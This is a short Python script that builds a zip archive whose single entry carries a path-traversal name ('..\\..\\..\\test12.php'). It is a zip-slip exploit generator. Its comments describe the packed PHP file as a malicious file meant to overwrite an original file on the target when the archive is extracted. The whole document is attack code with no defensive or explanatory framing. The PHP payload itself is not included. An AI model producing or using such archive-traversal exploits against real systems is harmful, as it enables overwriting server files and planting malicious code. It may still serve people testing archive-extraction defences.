import zipfile
# the name of the zip file to generate
zf = zipfile.ZipFile('out.zip', 'w')
# the name of the malicious file that will overwrite the origial file (must exist on disk)
fname = 'test12.php'
#destination path of the file
zf.write(fname, '..\\..\\..\\test12.php')
